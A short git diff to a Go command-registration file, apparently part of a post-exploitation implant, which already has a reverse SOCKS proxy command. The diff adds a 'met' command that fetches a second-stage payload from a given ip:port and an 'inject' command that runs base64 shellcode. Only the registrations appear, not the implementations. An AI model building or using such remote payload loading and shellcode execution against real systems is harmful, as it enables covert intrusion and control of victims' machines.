@@ -144,4 +144,18 @@ func RegisterCommands(sh *ishell.Shell) {
 		LongHelp: "Starts a reverse socks proxy and reverse-forwards it to <port> on the embedded host. SSH connect info must be embedded at compile time.",
 		Func:     Socks,
 	})
+
+	sh.AddCmd(&ishell.Cmd{
+		Name:     "met",
+		Help:     "met <https|tcp> <ip:port>",
+		LongHelp: "Fetch a second stage from ip:port",
+		Func:     Met,
+	})
+
+	sh.AddCmd(&ishell.Cmd{
+		Name:     "inject",
+		Help:     "inject <base64_shellcode>",
+		LongHelp: "Execute shellcode",
+		Func:     Inject,
+	})
 }
